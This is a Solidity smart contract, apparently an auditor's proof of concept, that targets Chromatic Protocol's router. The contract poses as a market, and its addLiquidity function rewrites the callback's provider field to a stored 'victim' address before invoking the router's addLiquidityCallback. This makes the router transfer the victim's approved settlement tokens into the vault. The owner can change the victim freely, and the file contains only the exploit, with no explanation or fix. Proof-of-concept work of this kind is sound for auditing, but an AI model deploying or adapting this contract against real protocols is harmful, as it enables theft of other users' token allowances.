// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ChromaticRouter} from "@chromatic-protocol/contracts/periphery/ChromaticRouter.sol";
import {LpReceipt} from "@chromatic-protocol/contracts/core/libraries/LpReceipt.sol";
import {IChromaticLiquidityCallback} from "@chromatic-protocol/contracts/core/interfaces/callback/IChromaticLiquidityCallback.sol";

contract MockCallBack{

    address public owner;
    address public victim;
    address public settlementToken;
    address public vault;
    ChromaticRouter public contract_ChromaticRouter;

    constructor(address _router, address _victim, address _settlementToken, address _vault){
        owner = msg.sender;
        victim = _victim;
        settlementToken = _settlementToken;
        vault = _vault;
        contract_ChromaticRouter = ChromaticRouter(_router);
    }

    function setVictim(address _newVictim) public {
        require(owner == msg.sender, "Not owner");
        victim = _newVictim;
    }

    function addLiquidity(
        address recipient,
        int16 tradingFeeRate,
        bytes calldata data
    ) external returns (LpReceipt memory receipt) {

        /**
            struct AddLiquidityCallbackData {
                address provider;
                uint256 amount;
            }
        */
        ChromaticRouter.AddLiquidityCallbackData memory callbackData = abi.decode(data, (ChromaticRouter.AddLiquidityCallbackData));
        callbackData.provider = victim;
        bytes memory _data = abi.encode(callbackData);

        IChromaticLiquidityCallback(msg.sender).addLiquidityCallback(
            address(settlementToken),
            address(vault),
            _data
        );
    }
}